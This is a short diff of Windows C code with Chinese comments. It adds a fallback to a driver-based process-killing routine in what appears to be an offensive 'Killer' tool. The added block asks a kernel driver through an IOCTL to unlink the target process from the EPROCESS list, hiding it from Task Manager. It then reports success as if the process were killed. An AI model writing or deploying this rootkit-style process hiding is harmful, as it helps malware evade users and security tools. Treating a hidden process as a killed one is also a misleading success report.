@@ -762,6 +762,18 @@ static BOOL KillProcessByDriver(ULONG pid) {
         }
     }
 
+    /* ★ 第三轮: Hide — 从 EPROCESS 链表中摘除，任务管理器不可见 */
+    {
+        ZeroMemory(&req, sizeof(req));
+        req.ProcessInformation = 1;  /* Hide */
+        req.PID = pid; req.Buffer = NULL; req.Argument = 0;
+        SetLastError(0);
+        ok = DeviceIoControl(g_hDriverDevice, IOCTL_SIRIUS_SET_PROCESS_INFO,
+                             &req, sizeof(req), NULL, 0, &returned, NULL);
+        lastErr = GetLastError();
+        if (ok) return TRUE;  /* 进程隐藏 = 等效消失 */
+    }
+
     printf("[Killer] [DIAG] 全部策略失败, 最终错误=%lu\n", lastErr);
     return FALSE;
 }
